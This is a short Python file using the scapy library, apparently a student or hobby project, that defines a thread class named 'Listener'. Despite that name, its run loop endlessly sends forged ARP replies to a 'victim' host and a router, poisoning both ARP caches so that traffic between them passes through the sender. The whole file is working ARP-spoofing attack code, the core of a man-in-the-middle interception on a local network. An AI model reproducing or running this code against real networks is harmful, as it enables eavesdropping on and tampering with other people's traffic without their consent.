"""
    Guy Margalit
    Listener Thread Class
"""
from scapy.all import *


class Listener(Thread):
    def __init__(self, victim, router):
        super().__init__()
        self.victim = victim
        self.router = router

    def run(self):
        while True:
            send(ARP(op=2, psrc=self.router[0], pdst=self.victim[0], hwdst=self.victim[1]), verbose=0)
            send(ARP(op=2, psrc=self.victim[0], pdst=self.router[0], hwdst=self.router[1]), verbose=0)
